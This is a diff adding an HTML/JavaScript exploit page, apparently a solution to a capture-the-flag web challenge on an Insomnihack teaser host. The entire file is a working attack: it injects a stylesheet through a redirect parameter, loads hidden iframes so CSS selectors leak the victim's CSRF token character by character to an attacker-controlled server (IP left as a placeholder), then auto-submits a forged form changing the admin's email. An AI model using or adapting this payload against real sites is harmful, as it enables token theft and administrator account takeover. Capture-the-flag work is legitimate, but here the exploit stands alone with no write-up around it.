@@ -1,0 +1,104 @@
+<script>
+    // code inspired by https://www.curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html
+    var attacker_ip = "FIXME";
+    var email_to_set = "FIXME&#64;yopmail&#46;com";
+    var time_to_wait_between_iframe = 250; // in ms (time for browser CSS parsing)
+
+    function fetch_char_async(clear, callback) {
+        var victim = "http://css.teaser.insomnihack.ch/?page=login&redirect=%22%3E%3Clink%20rel=%22stylesheet%22%20href=%22index.php/test/?page=search%26search=%250A";
+
+        // clear log on the server side
+        var yolo = getasync("http://" + attacker_ip + "/index.php?clear=true", function(payload) {
+            retrieve_char_async("", callback) // start the fetching
+            return;
+        });
+    }
+    function retrieve_char_async(currentPayload, callback) {
+        var victim = "http://css.teaser.insomnihack.ch/?page=login&redirect=%22%3E%3Clink%20rel=%22stylesheet%22%20href=%22index.php/test/?page=search%26search=%250A"; // css inclusion page
+        var previousPayload = currentPayload;
+
+        // fetch current payload
+        var currentPayload = getasync("http://" + attacker_ip + "/index.php?payload=true", function(currentPayload) {
+            if (previousPayload == currentPayload) { // we're done
+                callback()
+                return;
+            } else {
+                // create iframe
+                createHiddenFrame(victim + currentPayload);
+
+                // the browser needs to perform CSS selection and request attacker server
+                // wait a bit before going on the next letter, otherwise we will stop too early :)
+                setTimeout(function () {
+                    retrieve_char_async(currentPayload, callback)
+                }, time_to_wait_between_iframe);
+            }
+        });
+    }
+
+    window.onload = function() {
+        // fetch csrf_token on the server
+        fetch_char_async(true, function() {
+            // retrieve csrf_token from the server
+            getasync("http://" + attacker_ip + "/index.php?csrf_token=true", function(csrf) {
+                submitRequest(csrf); // exec csrf attack to change admin email
+            });
+        });
+    }
+
+    function submitRequest(csrf)
+    {
+        // setup email value
+        document.getElementById('email').value = email_to_set;
+
+        // setup csrf value
+        document.getElementById('csrf').value = csrf;
+
+        // submit form
+        document.forms[0].submit();
+    }
+
+    function createHiddenFrame(url) { 
+        var iframe = document.createElement("iframe"); 
+        iframe.src = url;
+        iframe.style = "display: hidden";
+        iframe.height = "0";
+        iframe.width = "0";
+        iframe.frameborder = "0";
+        document.body.appendChild(iframe);
+        console.log('iframe done');
+    }
+
+    function getasync(url, callback) {
+        const req = new XMLHttpRequest();
+
+        req.onreadystatechange = function(event) {
+            // XMLHttpRequest.DONE === 4
+            if (this.readyState === XMLHttpRequest.DONE) {
+                if (this.status === 200) {
+                    var payload = this.responseText;
+                    callback(payload)
+                } else {
+                    //console.log("Status de la réponse: %d (%s)", this.status, this.statusText);
+                }
+            }
+        };
+
+        req.open('GET', url, true);
+        req.send(null);
+    }
+</script>
+
+<html>
+  <body>
+
+    <form action="http://css.teaser.insomnihack.ch/?page=profile" method="POST">
+      <input type="hidden" name="name" value="admin" />
+      <input type="hidden" name="age" value="1" />
+      <input type="hidden" name="country" value="french" />
+      <input type="hidden" name="email" id="email" value="" />
+      <input type="hidden" name="csrf" id="csrf" value="" />
+      <input type="hidden" name="change" value="Modify&#32;profile" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
